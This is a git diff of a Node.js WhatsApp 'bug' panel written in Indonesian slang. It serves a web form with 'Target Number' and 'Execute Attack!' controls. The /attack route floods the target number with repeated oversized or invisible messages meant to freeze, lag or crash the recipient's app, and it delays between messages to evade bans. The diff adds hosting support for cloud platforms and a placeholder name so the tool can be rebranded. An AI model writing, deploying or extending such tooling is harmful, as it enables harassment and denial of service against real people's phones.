@@ -6,6 +6,9 @@ const bodyParser = require('body-parser');
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// BIAR BISA JALAN DI RAILWAY/RENDER
+const port = process.env.PORT || 3000;
+
 const client = new Client({
     authStrategy: new LocalAuth(),
     puppeteer: { 
@@ -15,14 +18,14 @@ const client = new Client({
 });
 
 client.on('qr', (qr) => {
-    console.log('SCAN QR INI, JANGAN LAMA-LAMA:');
+    console.log('SCAN QR INI, BOS:');
     qrcode.generate(qr, {small: true});
 });
 
 client.on('ready', () => {
-    console.log('\n====================================');
-    console.log('PANEL BUG JALAN: http://localhost:3000');
-    console.log('====================================\n');
+    console.log(`\n====================================`);
+    console.log(`PANEL READY! PORT: ${port}`);
+    console.log(`====================================\n`);
 });
 
 // --- UI DASHBOARD SANGAR ---
@@ -30,7 +33,7 @@ app.get('/', (req, res) => {
     res.send(`
         <html>
         <head>
-            <title>DN SCRIPTS - WA BUG</title>
+            <title>DN SCRIPTS - PANEL</title>
             <style>
                 body { background: #050505; color: white; font-family: 'Courier New', sans-serif; display: flex; justify-content: center; padding: 20px; }
                 .card { width: 100%; max-width: 380px; background: #0f0f0f; border-radius: 15px; border: 1px solid #ff0055; overflow: hidden; box-shadow: 0 0 20px #ff005544; }
@@ -40,13 +43,24 @@ app.get('/', (req, res) => {
                 input, select { width: 100%; background: #1a1a1a; border: 1px solid #333; padding: 12px; color: white; border-radius: 8px; margin-bottom: 15px; outline: none; }
                 button { width: 100%; background: #ff0055; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
                 button:hover { background: #cc0044; box-shadow: 0 0 10px #ff0055; }
-                .status { font-size: 10px; color: #666; text-align: center; margin-top: 10px; }
+                .profile { display: flex; align-items: center; margin-bottom: 20px; background: #151515; padding: 10px; border-radius: 10px; }
+                .avatar { width: 35px; height: 35px; background: #ff0055; border-radius: 50%; margin-right: 10px; }
             </style>
         </head>
         <body>
             <div class="card">
-                <div class="banner"><h2 style="color:#ff0055; text-shadow: 0 0 10px #ff0055;">DN RULLZSY</h2></div>
+                <div class="banner">
+                    <h2 style="color:#ff0055; text-shadow: 0 0 10px #ff0055;">NAMA LU DISINI</h2>
+                </div>
                 <div class="content">
+                    <div class="profile">
+                        <div class="avatar"></div>
+                        <div>
+                            <div style="font-size: 14px; font-weight: bold;">NAMA LU</div>
+                            <div style="font-size: 10px; color: #666;">ROLE: OWNER / DEV</div>
+                        </div>
+                    </div>
+
                     <form action="/attack" method="POST">
                         <label>Target Number</label>
                         <input type="text" name="number" placeholder="62812xxxxx" required>
@@ -64,7 +78,6 @@ app.get('/', (req, res) => {
 
                         <button type="submit">Execute Attack!</button>
                     </form>
-                    <div class="status">SYSTEM VERSION 1.0.4 - STABLE</div>
                 </div>
             </div>
         </body>
@@ -76,10 +89,12 @@ app.get('/', (req, res) => {
 app.post('/attack', async (req, res) => {
     const { number, type, count } = req.body;
     const chatId = number + "@c.us";
-    let text = "DN-BUG-";
+    
+    // GANTI "BY NAMA LU" DI BAWAH INI
+    let text = "ATTACKED BY NAMA LU - "; 
 
-    if (type === "freeze") text = "░".repeat(10000); // Teks berat bikin lag
-    if (type === "spam") text = "🔥 SPAMMED BY FINAS HUB 🔥";
+    if (type === "freeze") text = "░".repeat(10000); 
+    if (type === "spam") text += "🔥 AWAS HP LU MELEDAK 🔥";
     if (type === "crash") text = "Buffer-Crash-".repeat(1000);
     if (type === "delay") text = " ".repeat(4000) + "Invisible-Lag";
 
@@ -89,7 +104,7 @@ app.post('/attack', async (req, res) => {
         try {
             await client.sendMessage(chatId, text);
             console.log(`[✔] Packet ${i+1} sent.`);
-            await new Promise(r => setTimeout(r, 700)); // Jeda agar tidak langsung banned
+            await new Promise(r => setTimeout(r, 800)); 
         } catch (e) {
             console.log("Error: " + e);
         }
@@ -97,5 +112,8 @@ app.post('/attack', async (req, res) => {
     res.send('<h1>SERANGAN TERKIRIM!</h1><a href="/" style="color:red;">KEMBALI KE PANEL</a>');
 });
 
-app.listen(3000);
+app.listen(port, () => {
+    console.log(`Server running on port ${port}`);
+});
+
 client.initialize();
